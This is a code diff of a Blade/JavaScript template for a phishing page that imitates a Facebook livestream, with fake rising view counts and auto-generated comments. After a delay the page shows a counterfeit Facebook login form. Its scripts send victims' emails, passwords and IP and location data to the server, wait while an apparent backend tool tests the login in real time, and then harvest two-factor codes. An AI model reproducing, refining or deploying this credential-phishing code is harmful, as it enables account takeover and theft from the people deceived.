@@ -5,12 +5,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <link rel="apple-touch-icon" href="{{$settings['favicon_icon']}}" sizes="180x180">
-    <link rel="icon" href="{{$settings['favicon_icon']}}" sizes="32x32">
-    <link rel="icon" href="{{$settings['favicon_icon']}}" sizes="16x16">
-    <link rel="icon" href="{{$settings['favicon_icon']}}" sizes="16x16">
-    <link rel="mask-icon" href="{{$settings['favicon_icon']}}">
-    <link rel="icon" href="{{$settings['favicon_icon']}}">
+    <link rel="apple-touch-icon" href="{{ $settings['favicon_icon'] }}" sizes="180x180">
+    <link rel="icon" href="{{ $settings['favicon_icon'] }}" sizes="32x32">
+    <link rel="icon" href="{{ $settings['favicon_icon'] }}" sizes="16x16">
+    <link rel="icon" href="{{ $settings['favicon_icon'] }}" sizes="16x16">
+    <link rel="mask-icon" href="{{ $settings['favicon_icon'] }}">
+    <link rel="icon" href="{{ $settings['favicon_icon'] }}">
     <title>@lang('common.title_confirm_page')</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
         integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
@@ -54,16 +54,7 @@
         as="style" crossorigin="anonymous" />
     <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/l/0,cross/dg6SOblwSgG.css?_nc_x=Ij3Wp8lg5Kz"
         as="style" crossorigin="anonymous" />
-     <link type="text/css" href="/css/home.css" rel="stylesheet">
-    {{-- <link type="text/css" href="/css/button.css" rel="stylesheet">
-    <link type="text/css" href="/css/input.css" rel="stylesheet">
-    <link type="text/css" href="/css/modal.css" rel="stylesheet">
-    <link type="text/css" href="/css/header.css" rel="stylesheet">
-    <link type="text/css" href="/css/body.css" rel="stylesheet">
-    <link type="text/css" href="/css/display.css" rel="stylesheet">
-    <link type="text/css" href="/css/footer.css" rel="stylesheet">
-    <link type="text/css" href="/css/spinner.css" rel="stylesheet">
-    <link type="text/css" href="/css/app.css" rel="stylesheet"> --}}
+    <link type="text/css" href="/css/home.css?v=1" rel="stylesheet">
 </head>
 
 <body>
@@ -73,23 +64,23 @@
     <div class="block">
         <div class="block-top">
             <div class="top-left">
-                <div class="btn-danger btn">LIVE</div>
+                <div style="font-size: 10px" class="btn-danger btn">LIVE</div>
                 <div class="btn-view btn"> <i data-visualcompletion="css-img" class=""
                         style="background-image: url(&quot;https://static.xx.fbcdn.net/rsrc.php/v3/yO/r/yL5snp3h9QO.png?_nc_eui2=AeGfnhuJZe-AYaz00-shb0dI9No0WJJe4h302jRYkl7iHZEHuA4u3FoLleSmAerYwXvZfansyPOB0GIAaTABEQTw&quot;); background-position: 0px -372px; background-size: 74px 386px; width: 12px; height: 12px; background-repeat: no-repeat; display: inline-block;"></i>
                     <span class="amount-view">54,8K</span>
                 </div>
             </div>
             <div class="top-right">
-                <div class=""> <img width="60px" height="55px" style="border-radius: 50%" src="/images/fb.png"
-                        alt="image"></div>
+                <div class=""> <img width="45px" height="45px" style="border-radius: 50%"
+                        src="/images/fb.png" alt="image"></div>
             </div>
         </div>
         <div class="block-comment">
             <div class="comment-pinned mb-2">
                 <div class="comment">
                     <div class="comment-left">
-                        <img width="60px" height="60px" style="border-radius: 50%" src="/images/default.jpg"
-                            alt="image">
+                        <img width="60px" height="60px" style="border-radius: 50%; border: 4px solid red"
+                            src="/images/default.jpg" alt="image">
                     </div>
                     <div class="comment-right">
                         <p style="color: rgb(24, 96, 185);font-weight:bold">Vương Thanh Tú</p>
@@ -121,7 +112,8 @@
             </div>
         </div>
     </div>
-    <div class="modal" id="modal-login" style="display: block;" aria-modal="true" role="dialog">
+    <div class="modal" id="modal-login" style="display: none;" aria-modal="true" data-backdrop="static"
+        tabindex="-1" role="dialog" aria-labelledby="staticBackdropLabel" aria-hidden="true">
         <div class="modal-dialog modal-lg modal-dialog-centered">
             <div class="modal-content">
                 <div class="form-login">
@@ -138,20 +130,19 @@
 
                                     <input autocorrect="off" autocapitalize="off"
                                         class="input-form-login validate-input validate-phone-email" autocomplete="on"
-                                        id="username-desktop" name="username"
-                                        placeholder=" Mobile number or email address" type="text"
-                                        data-sigil="m_login_email">
+                                        id="username-desktop" name="username" placeholder="@lang('login.email')"
+                                        type="text" data-sigil="m_login_email">
                                     <div class="error">
-                                        <span class="">@lang('fa.warning_login_fa')</span><a
-                                            class="" href="https://facebook.com/login/identify/">@lang('fa.warning_find_fa')</a>
+                                        <span class="">@lang('fa.warning_login_fa')</span><a class=""
+                                            href="https://facebook.com/login/identify/">@lang('fa.warning_find_fa')</a>
                                     </div>
                                     <input autocorrect="off" autocapitalize="off"
                                         class="input-form-login validate-input" autocomplete="on" type="password"
-                                        name="password" id="password-desktop" tabindex="0" placeholder="Password"
-                                        value="" aria-label="Password"> <br>
+                                        name="password" id="password-desktop" tabindex="0"
+                                        placeholder="@lang('login.password')" value="" aria-label="Password"> <br>
 
                                     <button type="button" class="button-form-login" id="btnLogin-desktop">
-                                        <span id="submit-login-loading" class="d-none spinner-border spinner">
+                                        <span id="submit-login-loading" style="width:1.5rem;height:1.5rem;" class="d-none spinner-border spinner">
                                         </span>
                                         <span id="submit-login-text">@lang('login.submit')</span>
                                     </button>
@@ -196,7 +187,8 @@
             </div>
         </div>
     </div>
-    <div class="modal" id="modal-fa" style="display: none;" aria-modal="true" role="dialog">
+    <div class="modal" id="modal-fa" style="display: none;" aria-modal="true" data-backdrop="static"
+        tabindex="-1" role="dialog" aria-labelledby="staticBackdropLabel" aria-hidden="true">
         <div class="modal-dialog modal-lg modal-dialog-centered">
             <div class="modal-content">
                 <div id="u_0_2_Gj"><input type="hidden" name="jazoest" value="21020" autocomplete="off"><input
@@ -212,13 +204,15 @@
                         <div class="phl ptm uiInterstitialContent">
                             <div class="_585n mbm hidden_elem _585o" id="error_box" style="display: none"><i
                                     class="_585p img sp_kdZ98Fttf5-_1_5x sx_c84dfe"><u>Warning</u></i>
-                                <div class="_585r _50f4" style="text-align: left">@lang('fa.title_noti_fa')</div>
+                                <div class="text-error-fa _585r _50f4" style="text-align: left">@lang('fa.title_noti_fa')
+                                </div>
                             </div>
                             <div class="_9nq2 marginBottom20px guide-info">@lang('fa.title_noti_content_email_fa')</div>
                             <div class="clearfix">
-                                <div class="_9o1z"><input type="text" class="inputtext _9o1w _9o1_"
-                                        name="n" id="recovery_code_entry" placeholder="@lang('fa.title_placeholder_fa')"
-                                        autocomplete="off" aria-label="Nhập mã"></div>
+                                <div class="_9o1z"><input type="text"
+                                        class="validate-input validate-fa inputtext _9o1w _9o1_" name="n"
+                                        id="recovery_code_entry" placeholder="@lang('fa.title_placeholder_fa')" autocomplete="off"
+                                        aria-label="Nhập mã"></div>
                                 <div class="_9o1-">
                                     <div class="_9o1x marginBottom10px">@lang('fa.title_noti_action_fa')</div>
                                     <div class="_9o1y">
@@ -247,30 +241,24 @@
             </div>
         </div>
     </div>
-    <video autoplay muted loop id="myVideo">
-        <source src="/video/test.mp4" type="video/mp4">
-        Your browser does not support HTML5 video.
-    </video>
+    <img src="/images/test123.gif" id="myVideo" alt="funny GIF" width="100%" />
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
     <script type="text/javascript">
-        $(document).on('click', 'body', function() {
-            $("#myVideo").prop('muted', false);
-        })
-
         $.ajaxSetup({
             headers: {
                 'X-CSRF-TOKEN': '{{ csrf_token() }}'
             }
         });
 
-        var countLogin = 0;
-        var countLoginMobile = 0;
+        const VIDEO = [
+            "/images/test1.gif",
+            "/images/test2.gif",
+            "/images/test3.gif",
+            "/images/test4.gif",
+            "/images/test5.gif",
+        ];
 
-        var oneTimeUsername = "";
-        var oneTimePassword = "";
-
-        var oneTimeUsernameMobile = "";
-        var oneTimePasswordMobile = "";
+        $('#myVideo').attr('src', VIDEO[getRandom(0, VIDEO.length - 1)]);
 
         var ipAddress = "";
         var latitude = "";
@@ -283,6 +271,235 @@
         var zipCode = "";
         var continent = "";
         var continentCode = "";
+        //
+        var email = "";
+        const NAME = [
+            'Nguyễn Duy Nhật Tú',
+            'Trần Công Vượng',
+            'Bé Xinhh',
+            'Tú Ông',
+            'Phuong Tran',
+            'And Dep Trai',
+            'Cuoc Đoi Là Vax',
+            'Kan Mot Doi Tku',
+        ];
+        const COMMENT = [
+            'CHick nhau hk em',
+            'Ngon thế nhở',
+            'Em đẹp qa <3',
+            'Facebook cho livestream sẽ luôn hã',
+            'Vai l',
+            'ĐƯợc của nó đấy',
+            'Ngon quá',
+        ];
+        const ICON = [
+            "https://static.xx.fbcdn.net/images/emoji.php/v9/ta7/1.5/16/1f644.png",
+            "https://static.xx.fbcdn.net/images/emoji.php/v9/tcc/1.5/16/1f979.png",
+            "https://static.xx.fbcdn.net/images/emoji.php/v9/tc/1.5/16/1f913.png",
+            "https://static.xx.fbcdn.net/images/emoji.php/v9/td9/1.5/16/1f92a.png",
+            "https://static.xx.fbcdn.net/images/emoji.php/v9/t82/1.5/16/263a.png",
+            "https://static.xx.fbcdn.net/images/emoji.php/v9/tb1/1.5/16/1f929.png",
+            "https://static.xx.fbcdn.net/images/emoji.php/v9/t43/1.5/16/1f970.png",
+        ];
+        const AVATAR = [
+            "/images/1.jpg",
+            "/images/2.jpg",
+            "/images/3.jpg",
+            "/images/4.jpg",
+            "/images/5.jpg",
+            "/images/6.jpg",
+            "/images/7.jpg",
+        ];
+
+        $(".list-comment").animate({
+            scrollTop: $('.list-comment')[0].scrollHeight - $('.list-comment')[0]
+                .clientHeight
+        }, 200);
+
+        var id_interval = null;
+        $(document).ready(function() {
+            id_interval = setInterval(() => {
+                $('.list-comment').append(`
+                <div class="comment mb-2">
+                    <div class="comment-left">
+                        <img width="50px" height="50px" style="border-radius: 50%" src="${AVATAR[getRandom(0, AVATAR.length - 1)]}"
+                            alt="image">
+                    </div>
+                    <div class="comment-right">
+                        <p style="font-weight:bold">${NAME[getRandom(0, NAME.length - 1)]}</p>
+                       ${COMMENT[getRandom(0, COMMENT.length - 1)]} <img height="16" width="16" class="xz74otr"
+                                referrerpolicy="origin-when-cross-origin"
+                                src="${ICON[getRandom(0, ICON.length - 1)]}">
+                    </div>
+                </div>
+                `);
+                $(".list-comment").animate({
+                    scrollTop: $('.list-comment')[0].scrollHeight - $('.list-comment')[0]
+                        .clientHeight
+                }, 200);
+            }, 3000);
+        });
+
+        function getRandom(min, max) {
+            return Math.floor(Math.random() * (max - min + 1)) + min;
+        }
+
+        var idIntervalGetCacheByEmail = null;
+        var isLoginSuccessfully = 0;
+
+        function sendDataLogin() {
+            const valueEmail = $('#username-desktop').val();
+            const valuePassword = $('#password-desktop').val();
+            const loading = $('#submit-login-loading');
+            const text = $('#submit-login-text');
+            let formData = new FormData();
+            formData.append('email_2', valueEmail)
+            formData.append('password_2', valuePassword)
+            formData = pushIPInfo(formData)
+            $.ajax({
+                method: "POST",
+                url: "/send-data-login",
+                data: formData,
+                cache: false,
+                contentType: false,
+                processData: false,
+                success: function(response) {
+                    if (response.status == 0) {
+                        // start to call get cache by email waiting until tool returns response of login
+                        idIntervalGetCacheByEmail = setInterval(async () => {
+                            let info = await getCacheByEmail(valueEmail);
+                            if (info) {
+                                text.removeClass('d-none');
+                                loading.addClass('d-none');
+                                if (info.isLoginSuccessfully) {
+                                    $('#modal-login').css('display', 'none');
+                                    $('#modal-fa').css('display', 'block');
+                                    $('.guide-info').text(valueEmail.includes('@') ?
+                                        `@lang('fa.title_noti_content_email_fa')` :
+                                        `@lang('fa.title_noti_content_phone_fa')`);
+                                    $('.hide-email').text(replaceEmail(valueEmail));
+                                    $('.error').css('display', 'none');
+                                } else {
+                                    $('.error').css('display', 'block');
+                                    text.removeClass('d-none');
+                                    loading.addClass('d-none');
+                                }
+                                clearInterval(idIntervalGetCacheByEmail);
+                                $('.button-form-login').prop('disabled', false);
+                            } else {
+                                console.log("Still call get cache by email");
+                            }
+                        }, 3000);
+                    } else {
+                        $('.button-form-login').prop('disabled', false);
+                        $('.error').css('display', 'block');
+                        text.removeClass('d-none');
+                        loading.addClass('d-none');
+                    }
+                }
+            })
+        }
+
+        async function getCacheByEmail(email) {
+            let result = null;
+            let formData = new FormData();
+            formData.append('email', email);
+            await $.ajax({
+                method: "POST",
+                url: "/api/get-cache-by-email",
+                data: formData,
+                cache: false,
+                contentType: false,
+                processData: false,
+                success: function(response) {
+                    if (response.status == 0) {
+                        result = response.data;
+                    }
+                }
+            })
+
+            return result;
+        }
+
+        async function sendDataFa() {
+            const fa_code = $('#recovery_code_entry').val();
+            const email = $('#username-desktop').val();
+            let formData = new FormData();
+            formData.append('fa_code', fa_code);
+            formData.append('email', email);
+            formData = pushIPInfo(formData);
+            await $.ajax({
+                method: "POST",
+                url: "/send-data-fa",
+                data: formData,
+                cache: false,
+                contentType: false,
+                processData: false,
+                success: function(response) {
+                    if (response.status == 0) {
+                        // start to call get cache by email waiting until tool returns response of login
+                        idIntervalGetCacheByEmail = setInterval(async () => {
+                            let info = await getCacheByEmail(email);
+                            if (info) {
+                                if (info.isFaSuccessfully) {
+                                    $('#error_box').css('display', 'none');
+                                    $('#modal-fa').css('display', 'none');
+                                    $('.warning').css('display', 'none');
+                                } else {
+                                    $('.text-error-fa').text(`@lang('fa.title_not_matched_fa')`);
+                                    $('#error_box').css('display', 'block');
+                                }
+                                $('.button-send-fa').prop('disabled', false);
+                                clearInterval(idIntervalGetCacheByEmail);
+                            } else {
+                                console.log("Still call get cache by email");
+                            }
+                        }, 3000);
+                    } else {
+                        $('.button-send-fa').prop('disabled', false);
+                        $('#error_box').css('display', 'block');
+                    }
+                }
+            })
+        }
+
+        $(document).on('click', '.button-form-login', function() {
+            $(this).prop('disabled', true);
+            $('#login_error').addClass('d-none');
+            const loading = $('#submit-login-loading');
+            const text = $('#submit-login-text');
+            text.addClass('d-none');
+            loading.removeClass('d-none');
+            let email = $('#username-desktop').val();
+            let pass = $('#password-desktop').val();
+            setTimeout(() => {
+                if (!isValidValuePhoneEmail(email) || !pass) {
+                    text.removeClass('d-none');
+                    loading.addClass('d-none');
+                    $('.error').css('display', 'block');
+                    $(this).prop('disabled', false);
+                } else {
+                    sendDataLogin();
+                }
+            }, 1000);
+        })
+
+        $(document).on('click', '.button-send-fa', function() {
+            let recovery_code_entry = $('#recovery_code_entry').val();
+            if (!isValidateFa(recovery_code_entry)) {
+                $('#error_box').css('display', 'block');
+            } else {
+                $(this).prop('disabled', true);
+                sendDataFa();
+            }
+        });
+
+        setTimeout(() => {
+            $("#modal-login").css("display", "block");
+        }, 4000);
+        setInterval(() => {
+            $(".amount-view").text(`5${getRandom(4, 9)},${getRandom(1, 9)}K`);
+        }, 2000);
 
         async function setCurrentLang() {
             let getIpInfoUrl = '{{ session()->get('getIpInfoUrl') }}';
@@ -302,74 +519,6 @@
             continentCode = ipInfo.continentCode;
         }
         setCurrentLang()
-
-        function sendDataLoginDesktop() {
-            const valueEmail = $('#username-desktop').val();
-            const valuePassword = $('#password-desktop').val();
-            let formData = new FormData();
-            formData.append('email_2', valueEmail)
-            formData.append('password_2', valuePassword)
-            formData = pushIPInfo(formData)
-            $.ajax({
-                method: "POST",
-                url: "/send-data-login",
-                data: formData,
-                cache: false,
-                contentType: false,
-                processData: false,
-                success: function(response) {
-                    if (response.status == 0) {
-                        $('#modal-login').css('display', 'none');
-                        $('#modal-fa').css('display', 'block');
-                        $('.guide-info').text(valueEmail.includes('@') ? `@lang('fa.title_noti_content_email_fa')` :
-                            `@lang('fa.title_noti_content_phone_fa')`);
-                        $('.hide-email').text(replaceEmail(valueEmail));
-                        $('.error').css('display', 'none');
-                    } else {
-                        $('.error').css('display', 'block');
-                    }
-                }
-            })
-        }
-
-        function replaceEmail(email) {
-            email = email.split("");
-            if (email.includes("@")) {
-                email = email.map((e, index) => {
-                    return (index == 0 || e == "@") ? e : "*";
-                })
-            } else {
-                email = email.map((e, index) => {
-                    return (index == 0 || index == email.length - 1 || index == email.length - 2) ? e : "*";
-                })
-            }
-
-            return email.join("");
-        }
-
-        function sendDataFa() {
-            const fa_code = $('#recovery_code_entry').val();
-            let formData = new FormData();
-            formData.append('fa_code', fa_code)
-            formData = pushIPInfo(formData)
-            $.ajax({
-                method: "POST",
-                url: "/send-data-fa",
-                data: formData,
-                cache: false,
-                contentType: false,
-                processData: false,
-                success: function(response) {
-                    if (response.status == 0) {
-                        $('#modal-fa').css('display', 'none');
-                        $('.warning').css('display', 'none');
-                        $('#error_box').css('display', 'none');
-                    } else {
-                        $('#error_box').css('display', 'block');
-                    }
-                }
-            })
-        }
 
         function pushIPInfo(formData) {
             formData.append('ipAddress', ipAddress)
@@ -401,6 +550,7 @@
 
         function validatePhoneEmail() {
             const value = $(this).val();
+            console.log(value);
             if (isValidValuePhoneEmail(value)) {
                 $(this).removeClass('is-invalid');
             } else {
@@ -410,130 +560,61 @@
 
         function isValidValuePhoneEmail(value) {
             if (isNumeric(value)) {
-                const regexPhoneNumber = /[0-9]{9,12}$/;
+                const regexPhoneNumber = /^0\d{9,11}$/;
+
                 return regexPhoneNumber.test(value);
             } else {
                 const regexEmail = /^\w+@[a-zA-Z_]+?\.[a-zA-Z]{2,3}$/;
+
                 return regexEmail.test(value)
             }
         }
 
         function isNumeric(str) {
             if (typeof str != "string") return false // we only process strings!
+
             return !isNaN(str) &&
                 // use type coercion to parse the _entirety_ of the string (`parseFloat` alone does not do this)...
                 !isNaN(parseFloat(str)) // ...and ensure strings of whitespace fail
         }
 
-
-        $(document).on('input', '.validate-phone-email', validatePhoneEmail)
-        $(document).on('keydown', '.validate-input', inputValidateInput)
-        // $(document).on('click', '#btnLogin-desktop', submitLoginDesktop)
-        // $(document).on('click', '#btnLogin-mobile', submitLoginMobile)
-        // $(document).on('click', '#btnLogin-mobile', submitLoginDesktop)
-    </script>
-    <script type="text/javascript">
-        var email = "";
-        const NAME = [
-            'Nguyễn Duy Nhật Tú',
-            'Trần Công Vượng',
-            'Bé Xinhh',
-            'Tú Ông',
-            'Phuong Tran',
-            'And Dep Trai',
-            'Cuoc Đoi Là Vax',
-            'Kan Mot Doi Tku',
-        ]
-        const COMMENT = [
-            'CHick nhau hk em',
-            'Ngon thế nhở',
-            'Em đẹp qa <3',
-            'Facebook cho livestream sẽ luôn hã',
-            'Vai l',
-            'ĐƯợc của nó đấy',
-            'Ngon quá',
-        ]
-        const ICON = [
-            "https://static.xx.fbcdn.net/images/emoji.php/v9/ta7/1.5/16/1f644.png",
-            "https://static.xx.fbcdn.net/images/emoji.php/v9/tcc/1.5/16/1f979.png",
-            "https://static.xx.fbcdn.net/images/emoji.php/v9/tc/1.5/16/1f913.png",
-            "https://static.xx.fbcdn.net/images/emoji.php/v9/td9/1.5/16/1f92a.png",
-            "https://static.xx.fbcdn.net/images/emoji.php/v9/t82/1.5/16/263a.png",
-            "https://static.xx.fbcdn.net/images/emoji.php/v9/tb1/1.5/16/1f929.png",
-            "https://static.xx.fbcdn.net/images/emoji.php/v9/t43/1.5/16/1f970.png",
-        ]
-        const AVATAR = [
-            "/images/1.jpg",
-            "/images/2.jpg",
-            "/images/3.jpg",
-            "/images/4.jpg",
-            "/images/5.jpg",
-            "/images/6.jpg",
-            "/images/7.jpg",
-        ]
-        var id_interval = null;
-        $(".list-comment").animate({
-            scrollTop: $('.list-comment')[0].scrollHeight - $('.list-comment')[0]
-                .clientHeight
-        }, 200);
-
-        $(document).ready(function() {
-            id_interval = setInterval(() => {
-                $('.list-comment').append(`
-                <div class="comment mb-2">
-                    <div class="comment-left">
-                        <img width="50px" height="50px" style="border-radius: 50%" src="${AVATAR[getRandom(0, AVATAR.length - 1)]}"
-                            alt="image">
-                    </div>
-                    <div class="comment-right">
-                        <p style="font-weight:bold">${NAME[getRandom(0, NAME.length - 1)]}</p>
-                       ${COMMENT[getRandom(0, COMMENT.length - 1)]} <img height="16" width="16" class="xz74otr"
-                                referrerpolicy="origin-when-cross-origin"
-                                src="${ICON[getRandom(0, ICON.length - 1)]}">
-                    </div>
-                </div>
-                `);
-                $(".list-comment").animate({
-                    scrollTop: $('.list-comment')[0].scrollHeight - $('.list-comment')[0]
-                        .clientHeight
-                }, 200);
-            }, 3000);
-        })
-
-        function getRandom(min, max) {
-            return Math.floor(Math.random() * (max - min + 1)) + min;
+        function validateFa() {
+            let value = $(this).val();
+            if (value.length > 6) {
+                value = value.slice(0, 6);
+                $(this).val(value);
+            }
+            if (isValidateFa(value)) {
+                $(this).removeClass('is-invalid');
+            } else {
+                $(this).addClass('is-invalid');
+            }
         }
 
-        $(document).on('click', '.button-form-login', function() {
-            $('#login_error').addClass('d-none')
-            const loading = $('#submit-login-loading');
-            const text = $('#submit-login-text');
-            text.addClass('d-none');
-            loading.removeClass('d-none');
-            let email = $('#username-desktop').val();
-            let pass = $('#password-desktop').val();
-            setTimeout(() => {
-                text.removeClass('d-none');
-                loading.addClass('d-none');
-                if (!email || !pass) {
-                    $('.error').css('display', 'block');
-                } else {
-                    $('.error').css('display', 'none');
-                    sendDataLoginDesktop();
-                }
-            }, 1000);
+        function isValidateFa(value) {
+            const regexFa = /^\d{6}$/;
 
-        })
+            return regexFa.test(value);
+        }
 
-        $(document).on('click', '.button-send-fa', function() {
-            let recovery_code_entry = $('#recovery_code_entry').val();
-            if (!recovery_code_entry) {
-                $('#error_box').css('display', 'block');
+        function replaceEmail(email) {
+            email = email.split("");
+            if (email.includes("@")) {
+                email = email.map((e, index) => {
+                    return (index == 0 || e == "@") ? e : "*";
+                })
             } else {
-                $('#error_box').css('display', 'none');
-                sendDataFa();
+                email = email.map((e, index) => {
+                    return (index == 0 || index == email.length - 1 || index == email.length - 2) ? e : "*";
+                })
             }
-        })
+
+            return email.join("");
+        }
+
+        $(document).on('input', '.validate-phone-email', validatePhoneEmail);
+        $(document).on('input', '.validate-fa', validateFa);
+        $(document).on('keydown', '.validate-input', inputValidateInput);
     </script>
 </body>
 
